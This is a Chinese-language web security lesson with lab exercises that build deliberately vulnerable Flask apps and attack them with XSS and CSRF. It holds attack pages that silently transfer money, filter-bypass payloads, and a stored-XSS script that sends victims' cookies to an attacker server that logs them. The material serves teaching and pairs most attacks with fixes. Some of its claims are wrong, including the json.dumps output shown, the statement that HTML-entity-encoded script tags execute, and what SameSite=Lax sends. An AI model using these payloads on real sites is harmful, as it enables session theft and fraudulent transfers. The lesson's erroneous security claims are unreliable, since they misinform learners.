第五课：XSS攻击及防御
2.1 XSS攻击概述
2.1.1 定义
XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到可信网站的页面中，当其他用户访问时，这些脚本在浏览器中执行。
2.1.2 攻击流程
攻击者在存在漏洞的网站上提交恶意脚本。
网站存储或反射这些脚本。
普通用户访问该网站。
恶意脚本在用户浏览器中执行。
脚本可窃取Cookie、记录键盘、钓鱼等。
2.1.3 危害
Cookie窃取：通过document.cookie获取Cookie并发送到攻击者服务器。
会话劫持：利用窃取的Cookie冒充用户。
键盘记录：监听用户输入，窃取密码等敏感信息。
网页钓鱼：修改页面内容，显示虚假登录框。
DDOS攻击：利用用户浏览器发起大量请求。
2.2 XSS攻击类型
2.2.1 反射型XSS
恶意脚本通过URL参数传递，服务器将参数反射回页面并立即执行。
示例：

@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    return f'<h2>搜索 "{keyword}" 的结果</h2>'
若用户访问 /search?q=<script>alert('XSS')</script>，服务器返回的HTML中包含该脚本并执行。
2.2.2 存储型XSS
恶意脚本存储在服务器数据库或文件中，每次用户访问页面时都会触发。
示例：

comments = []
@app.route('/comment', methods=['POST'])
def add_comment():
    content = request.form.get('content')
    comments.append(content)  # 未过滤直接存储

@app.route('/comment')
def show_comments():
    html = '<h2>留言板</h2>'
    for c in comments:
        html += f'<div>{c}</div>'  # 未转义直接输出
    return html
攻击者提交包含<script>alert(1)</script>的留言后，每个访问留言板的用户都会触发脚本。
2.2.3 DOM型XSS
服务器返回的HTML正常，但客户端JavaScript在处理用户可控数据时，将其插入DOM导致脚本执行。
示例：

<script>
    var name = location.hash.substring(1);
    document.getElementById('greeting').innerHTML = 'Hello, ' + name;
</script>
若URL为page.html#<img src=x onerror=alert(1)>，innerHTML会将img标签作为HTML插入，触发onerror事件。
2.3 XSS攻击载荷
2.3.1 基本Payload

<script>alert('XSS')</script>
2.3.2 利用事件

<img src="x" onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input type="text" onfocus="alert(1)" autofocus>
2.3.3 利用伪协议

<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)"></iframe>
2.3.4 编码绕过
HTML实体编码：

<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
URL编码：

<a href="javascript:%61%6c%65%72%74%28%31%29">点击</a>
2.3.5 标签闭合技巧
若输入被插入到标签属性中，可提前闭合标签注入脚本：

<input value="USER_INPUT">
攻击者可构造：

"><script>alert(1)</script><input value="
2.4 XSS防御技术
2.4.1 输出转义（最根本）
根据输出上下文对用户数据进行转义。
HTML上下文转义：使用html.escape()（Python）或类似函数。

import html
user_input = '<script>alert(1)</script>'
safe_output = html.escape(user_input)
# 结果：&lt;script&gt;alert(1)&lt;/script&gt;
JavaScript上下文转义：使用JSON序列化。

import json
user_input = "'; alert(1); //"
safe_js = json.dumps(user_input)
# 结果：'\'; alert(1); //'
2.4.2 输入过滤
对用户输入进行白名单过滤，只允许安全的字符。

import re
def filter_xss(input_str):
    return re.sub(r'[^\w\s\.\,\!\?\-]', '', input_str)
2.4.3 Content Security Policy（CSP）
通过HTTP头限制资源加载来源，可有效防御XSS。

Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
该策略禁止内联脚本执行，只允许加载同源或指定可信源的脚本。
2.4.4 HttpOnly Cookie
设置Cookie的HttpOnly属性，防止JavaScript读取Cookie。

Set-Cookie: sessionid=abc123; HttpOnly
2.4.5 使用安全框架
现代前端框架（如React、Vue、Angular）默认对输出进行转义，降低XSS风险。

// React中，以下写法是安全的（自动转义）
<div>{userInput}</div>

// 危险写法（需要确保userInput已转义）
<div dangerouslySetInnerHTML={{__html: userInput}} />
2.5 实战案例分析
2.5.1 社交媒体留言板XSS
某社交网站留言板未对用户输入进行过滤和转义，攻击者发布包含恶意脚本的留言，导致所有查看留言的用户Cookie被窃取。修复方案：对输出进行HTML转义，并设置HttpOnly Cookie。
2.5.2 搜索引擎反射型XSS
某搜索引擎在搜索结果页面直接显示用户输入的搜索关键词，未做转义，导致反射型XSS漏洞。攻击者可通过发送恶意链接诱导用户点击。修复方案：对输出进行HTML转义。
2.5.3 富文本编辑器XSS绕过
富文本编辑器通常允许用户输入HTML标签，但若过滤不严，攻击者可利用事件处理器或伪协议绕过。修复方案：使用白名单过滤，只允许安全的标签和属性，并对属性值进行严格检查。


练习1-1：GET型CSRF漏洞复现
题目描述
构建一个存在GET型CSRF漏洞的银行转账应用，并编写恶意页面实现自动转账。
漏洞代码（bank_get_vulnerable.py）

"""
漏洞应用：银行转账系统（GET方式，无CSRF防护）
运行：python bank_get_vulnerable.py
"""
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)

# 模拟用户数据库
users = {
    'alice': {'password': '123456', 'balance': 1000},
    'attacker': {'password': 'hack', 'balance': 0}
}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    return f'欢迎 {username}，余额：${balance}<br><a href="/transfer?to_account=bob&amount=10">转账10给bob</a>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            resp.set_cookie('username', username)
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer')
def transfer():
    """GET方式转账（漏洞点）"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    to_account = request.args.get('to_account')
    amount = int(request.args.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    # 扣钱
    users[username]['balance'] -= amount
    # 给收款人加钱（简化，若不存在则创建）
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
转账接口使用GET方法，参数通过URL传递。
认证仅依赖Cookie中的username，未使用任何CSRF Token。
攻击者可构造恶意页面，利用<img>标签自动发起GET请求。
攻击代码（evil_get.html）

<!DOCTYPE html>
<html>
<head>
    <title>恶意页面</title>
</head>
<body>
    <h1>恭喜你中奖了！</h1>
    <!-- 隐藏图片，自动发起GET请求 -->
    <img src="http://127.0.0.1:5000/transfer?to_account=attacker&amount=500" style="display:none">
</body>
</html>
讲解：
当用户访问此页面时，浏览器会加载图片，向http://127.0.0.1:5000/transfer?to_account=attacker&amount=500发起GET请求。
如果用户已登录银行系统，浏览器会自动携带Cookie，导致转账被执行。
防御代码（修复GET型CSRF）

"""
修复方案：
1. 将敏感操作改为POST方法
2. 添加CSRF Token验证
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 生成CSRF Token用于表单
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return render_template_string('''
        欢迎 {{ username }}，余额：${{ balance }}<br>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input name="to_account"><br>
            金额: <input name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=token)

@app.route('/login', methods=['GET', 'POST'])
def login():
    # ...（同漏洞代码，略）
    pass

@app.route('/transfer', methods=['POST'])
def transfer():
    """POST方式，验证CSRF Token"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证CSRF Token
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return 'CSRF攻击检测！', 403

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    # ...（转账逻辑，略）
    return '转账成功'
讲解：
将转账接口改为POST，并添加CSRF Token验证。
Token在生成表单时存入Session，提交时比对，确保请求来自本网站表单。
攻击者无法获取Token，因此无法构造有效请求。
预期结果：攻击页面无法触发转账，因为请求为GET且无Token。

练习1-2：POST型CSRF漏洞复现
题目描述
利用自动提交表单实现POST型CSRF攻击。
漏洞代码（bank_post_vulnerable.py）

"""
漏洞应用：银行转账系统（POST方式，无CSRF防护）
运行：python bank_post_vulnerable.py
"""
from flask import Flask, request, make_response

app = Flask(__name__)
users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

# 登录和首页代码同练习1-1，此处省略
# 关键接口如下：

@app.route('/transfer', methods=['POST'])
def transfer():
    """POST方式转账（漏洞点：无Token验证）"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    users[username]['balance'] -= amount
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
转账接口使用POST方法，但未验证CSRF Token。
仅依赖Cookie认证，存在CSRF漏洞。
攻击代码（evil_post.html）

<!DOCTYPE html>
<html>
<head>
    <title>恶意页面</title>
</head>
<body>
    <h1>加载中，请稍候...</h1>
    <!-- 隐藏表单 -->
    <form id="csrf" action="http://127.0.0.1:5000/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker">
        <input type="hidden" name="amount" value="500">
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
讲解：
页面包含一个隐藏表单，通过JavaScript自动提交。
用户访问时，表单POST到银行接口，携带Cookie，完成转账。
防御代码（同练习1-1的防御代码）
添加CSRF Token验证即可防御。
预期结果：攻击页面提交后，由于无Token，被服务器拒绝（需实现防御）。

练习1-3：CSRF Token防御实现
题目描述
为转账功能添加CSRF Token验证，防御CSRF攻击。
防御代码（完整实现，含Token生成与验证）

"""
修复后的银行应用（含CSRF Token）
运行：python bank_csrf_fixed.py
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 生成Token
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return render_template_string('''
        <h2>欢迎 {{ username }}，余额：${{ balance }}</h2>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input type="text" name="to_account"><br>
            金额: <input type="number" name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=token)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            resp.set_cookie('username', username)
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer', methods=['POST'])
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证CSRF Token
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return 'CSRF攻击检测！', 403

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    users[username]['balance'] -= amount
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
Token生成：secrets.token_hex(16)生成随机字符串，存入session。
表单中通过隐藏字段传递Token。
处理POST时，比对请求中的Token与Session中的值，不一致则拒绝。
由于攻击者无法获取Session中的Token（同源策略限制），无法伪造有效请求。
测试：
正常提交表单可成功转账。
使用之前的恶意页面（evil_post.html）尝试攻击，将返回403。

练习1-4：SameSite Cookie防御实验
题目描述
通过设置Cookie的SameSite属性防御CSRF，并观察不同属性值的效果。
漏洞代码（带SameSite配置）

"""
SameSite Cookie防御实验
运行：python bank_samesite.py
"""
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)
users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    return f'欢迎 {username}，余额：${balance}<br><a href="/transfer?to_account=attacker&amount=500">转账</a>（GET）'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            # 重点：设置SameSite属性，可修改为Lax或Strict
            resp.set_cookie('username', username, samesite='Lax')  # 可改为'Strict'或'None'
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer')
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401
    to_account = request.args.get('to_account')
    amount = int(request.args.get('amount', 0))
    # 转账逻辑...
    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
测试步骤
设置SameSite=Lax：
登录后，打开恶意页面（evil_get.html），观察是否触发转账。
Lax模式下，GET跨站请求会携带Cookie，因此转账仍可能成功。
设置SameSite=Strict：
修改代码为resp.set_cookie('username', username, samesite='Strict')。
重新登录，再次测试恶意页面。
Strict模式下，跨站请求不会携带Cookie，因此攻击失败。
设置SameSite=None; Secure：
若需在跨站请求中携带Cookie（如单点登录），可设为None，但必须同时设置Secure（仅HTTPS）。
在本地HTTP环境下，浏览器可能忽略None，需要配置HTTPS测试。
讲解：
SameSite属性是浏览器级别的防御，无需修改应用逻辑。
Lax：大多数跨站子请求（如图片、链接）会携带Cookie，但POST表单不会。
Strict：所有跨站请求均不携带Cookie，最强防御但可能影响用户体验（如从外部链接访问本站会丢失登录状态）。
None：允许跨站携带Cookie，需配合Secure，不防御CSRF。
预期结果：
Lax：GET型CSRF仍可能成功。
Strict：GET型CSRF失败。

练习1-5：CSRF Token绕过尝试
题目描述
分析不安全的CSRF Token实现，尝试绕过防御。
漏洞代码（不安全的Token实现）

"""
有缺陷的CSRF Token实现
运行：python bank_insecure_token.py
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = 'secret'  # 固定密钥，不安全

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

# 缺陷1：Token存储在Cookie中，且无HttpOnly
# 缺陷2：Token未绑定Session，全局共享
global_token = secrets.token_hex(16)  # 每次重启服务器改变，但所有用户相同

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 将Token存入Cookie（可被JS读取）
    resp = make_response(render_template_string('''
        <h2>欢迎 {{ username }}，余额：${{ balance }}</h2>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input type="text" name="to_account"><br>
            金额: <input type="number" name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=global_token))
    resp.set_cookie('csrf_token', global_token)  # 将Token放入Cookie
    return resp

@app.route('/login', methods=['GET', 'POST'])
def login():
    # ...（同前）
    pass

@app.route('/transfer', methods=['POST'])
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证Token：从Cookie和表单中获取，比对
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')
    if not form_token or form_token != cookie_token:
        return 'CSRF攻击检测！', 403

    # 转账逻辑...
    return '转账成功'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
缺陷：Token存储在Cookie中，且未设置HttpOnly，因此JavaScript可以读取。
缺陷：Token全局共享，不绑定用户Session。
攻击代码（利用Cookie中的Token）

"""
绕过CSRF Token的攻击页面
需要先诱导用户访问此页面，页面会读取Cookie中的Token并构造表单提交
"""
import requests
from flask import Flask, request

# 攻击者服务器，用于接收窃取的Token
app = Flask(__name__)

@app.route('/')
def index():
    # 此页面被用户访问时，由于攻击者无法直接读取用户Cookie，需要通过其他方式
    # 但若攻击者能执行JavaScript，可以读取document.cookie
    # 下面是一个利用反射型XSS或其他漏洞获取Token的示例
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <script>
            // 尝试读取Cookie中的csrf_token
            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            var token = getCookie('csrf_token');
            if (token) {
                // 构造自动提交表单
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = 'http://127.0.0.1:5000/transfer';
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'csrf_token';
                input.value = token;
                form.appendChild(input);
                var to = document.createElement('input');
                to.type = 'hidden';
                to.name = 'to_account';
                to.value = 'attacker';
                form.appendChild(to);
                var amount = document.createElement('input');
                amount.type = 'hidden';
                amount.name = 'amount';
                amount.value = '500';
                form.appendChild(amount);
                document.body.appendChild(form);
                form.submit();
            } else {
                document.write('无法获取Token');
            }
        </script>
    </head>
    <body>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(port=8000)
讲解：
由于Token在Cookie中且无HttpOnly，攻击者可以通过JavaScript读取。
恶意页面读取Token后，自动构造包含正确Token的表单提交，从而绕过CSRF防御。
此攻击需要用户浏览器执行JavaScript（通常都支持），且没有其他限制（如CSP阻止内联脚本）。
防御改进：
Token不应存储在Cookie中，或设置HttpOnly。
Token应绑定用户Session，并确保每次提交后失效或刷新。
使用CSP限制脚本来源，阻止内联脚本执行。
练习2-1：反射型XSS复现
题目描述
构建一个存在反射型XSS漏洞的搜索页面，并触发弹窗。
漏洞代码（xss_reflected.py）

"""
反射型XSS漏洞应用
运行：python xss_reflected.py
"""
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # 漏洞：直接将用户输入拼接到HTML中
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{q}</h1>
        <form action="/search">
            <input type="text" name="q" value="{q}">
            <input type="submit" value="搜索">
        </form>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(debug=True, port=5001)
讲解：
用户输入的q参数直接被插入HTML，未做任何转义。
攻击者可构造包含JavaScript的URL，使脚本在受害者浏览器中执行。
攻击URL
访问：

http://127.0.0.1:5001/search?q=<script>alert('XSS')</script>
预期：弹窗显示"XSS"。
防御代码（输出转义）

"""
修复后的反射型XSS应用
"""
from flask import Flask, request
import html

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = html.escape(q)  # 转义HTML特殊字符
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
        <form action="/search">
            <input type="text" name="q" value="{safe_q}">
            <input type="submit" value="搜索">
        </form>
    </body>
    </html>
    '''
    return html_content

if __name__ == '__main__':
    app.run(debug=True, port=5001)
讲解：
使用html.escape()将<、>等字符转换为HTML实体，使脚本无法执行。
输入<script>变为&lt;script&gt;，显示为普通文本。

练习2-2：存储型XSS复现
题目描述
实现一个留言板功能，存在存储型XSS漏洞，并利用其窃取Cookie。
漏洞代码（xss_stored.py）

"""
存储型XSS漏洞应用（留言板）
运行：python xss_stored.py
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)
comments = []  # 存储留言

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        comments.append(content)  # 直接存储，未过滤

    # 显示所有留言
    html = '''
    <!DOCTYPE html>
    <html>
    <head><title>留言板</title></head>
    <body>
        <h2>留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        html += f'<div>{c}</div>\n'  # 直接输出，未转义
    html += '</body></html>'
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5002)
讲解：
留言内容直接存入列表，输出时未转义，导致存储型XSS。
攻击代码（提交恶意留言）
使用浏览器访问留言板，提交以下内容：

<script>
    var img = new Image();
    img.src = 'http://127.0.0.1:8000/steal?cookie=' + document.cookie;
</script>
或使用fetch：

<script>
    fetch('http://127.0.0.1:8000/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
攻击者服务器（attacker_server.py）

"""
攻击者服务器，接收窃取的Cookie
运行：python attacker_server.py
"""
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie', '')
    print(f'[!] 窃取到Cookie: {cookie}')
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f'{cookie}\n')
    return 'OK'  # 返回空图片或任意内容

if __name__ == '__main__':
    app.run(port=8000)
讲解：
攻击者服务器监听8000端口，记录收到的Cookie。
当其他用户访问留言板时，恶意脚本会向攻击者服务器发送请求，携带Cookie。
防御代码（输出转义）

"""
修复后的留言板
"""
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        # 存储时转义（也可存储原始，输出时转义）
        safe_content = html.escape(content)
        comments.append(safe_content)

    html = '''
    <!DOCTYPE html>
    <html>
    <head><title>留言板</title></head>
    <body>
        <h2>留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        html += f'<div>{c}</div>\n'  # 已转义，安全
    html += '</body></html>'
    return render_template_string(html)
讲解：
在存储或输出时对内容进行HTML转义，使脚本无法执行。
同时可设置HttpOnly Cookie，防止JavaScript读取Cookie，增加防御深度。

练习2-3：DOM型XSS复现
题目描述
创建一个包含DOM型XSS漏洞的页面，并利用URL片段触发XSS。
漏洞代码（dom_xss.html）

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS 演示</title>
</head>
<body>
    <h1>欢迎</h1>
    <div id="greeting"></div>
    <script>
        // 从URL片段中获取参数，直接插入DOM
        var name = location.hash.substring(1);  // 获取#后面的内容
        document.getElementById('greeting').innerHTML = 'Hello, ' + name;
    </script>
</body>
</html>
讲解：
location.hash获取URL中#后面的部分，用户可控。
innerHTML将内容作为HTML插入，导致XSS。
攻击URL
访问：

file:///path/to/dom_xss.html#<img src=x onerror=alert('XSS')>
或通过HTTP服务器访问：

http://127.0.0.1:5003/dom_xss.html#<img src=x onerror=alert('XSS')>
预期：弹窗出现。
防御代码（使用textContent代替innerHTML）

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS 修复</title>
</head>
<body>
    <h1>欢迎</h1>
    <div id="greeting"></div>
    <script>
        var name = location.hash.substring(1);
        // 使用textContent，将内容作为纯文本处理
        document.getElementById('greeting').textContent = 'Hello, ' + name;
    </script>
</body>
</html>
讲解：
textContent不会解析HTML标签，因此恶意代码被当作普通文本显示。
若必须插入HTML，应对输入进行转义或使用安全库（如DOMPurify）。

练习2-4：XSS防御实现（输出转义与CSP）
题目描述
为留言板应用添加XSS防御措施（输出转义和CSP），并验证效果。
防御代码（xss_defended.py）

"""
带有XSS防御的留言板（输出转义 + CSP）
运行：python xss_defended.py
"""
from flask import Flask, request, make_response, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        # 存储原始内容，输出时转义
        comments.append(content)

    # 构建HTML
    html_content = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>安全留言板</title>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
    </head>
    <body>
        <h2>安全留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        safe_c = html.escape(c)  # 输出转义
        html_content += f'<div>{safe_c}</div>\n'
    html_content += '</body></html>'

    response = make_response(render_template_string(html_content))
    # 也可通过HTTP头设置CSP
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response

if __name__ == '__main__':
    app.run(debug=True, port=5004)
讲解：
输出转义：html.escape(c)将HTML特殊字符转义，防止脚本注入。
CSP：通过Content-Security-Policy头限制脚本只能从同源加载，禁止内联脚本执行。
双重防御，即使转义失效（如富文本场景），CSP也能提供保护。
测试
提交恶意留言：<script>alert(1)</script>
页面显示为普通文本，不会弹窗。
若尝试内联脚本，CSP会阻止执行。

练习2-5：XSS过滤器绕过挑战
题目描述
面对一个简单的XSS过滤器（仅过滤<script>标签），尝试绕过。
漏洞代码（xss_filter_bypass.py）

"""
简单的XSS过滤器（仅替换<script>标签）
运行：python xss_filter_bypass.py
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

def filter_xss(input_str):
    # 简单过滤：删除<script>和</script>（不区分大小写？这里只处理小写）
    filtered = input_str.replace('<script>', '').replace('</script>', '')
    return filtered

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = filter_xss(q)  # 应用过滤器
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5005)
解：
过滤器仅删除<script>和</script>字符串，不处理其他标签或大小写变种。
绕过Payload（可成功）
大小写绕过：

<Script>alert(1)</Script>
过滤器只匹配小写，因此不会被删除。
嵌套标签绕过

<scr<script>ipt>alert(1)</scr</script>ipt>
过滤后变成<script>alert(1)</script>，仍可执行。
使用其他标签和事件：

<img src=x onerror=alert(1)>
完全绕过过滤器。
使用伪协议：

<a href="javascript:alert(1)">click</a>
使用编码：

&#60;script&#62;alert(1)&#60;/script&#62;
浏览器解析HTML实体后执行。
防御改进（完整转义）

"""
安全的过滤器：使用html.escape
"""
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = html.escape(q)  # 全面转义
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
    </body>
    </html>
    '''
    return render_template_string(html_content)
讲解：
使用html.escape()将所有HTML特殊字符转义，彻底防止XSS。
不应依赖黑名单过滤，应使用白名单或转义。

